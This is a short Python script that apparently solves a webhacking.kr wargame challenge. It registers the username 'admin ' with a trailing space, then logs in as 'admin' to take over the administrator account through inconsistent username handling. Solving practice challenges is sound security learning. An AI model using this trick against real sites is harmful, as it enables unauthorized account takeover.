from Solution.webhacking.basic import login

s = login()

r = s.post('http://webhacking.kr/challenge/web/web-05/mem/join.php', data={
    'id': 'admin ',
    'pw': '123'
})
print(r.text)

r = s.post('http://webhacking.kr/challenge/web/web-05/mem/login.php', data={
    'id': 'admin',
    'pw': '123'
})
print(r.text)
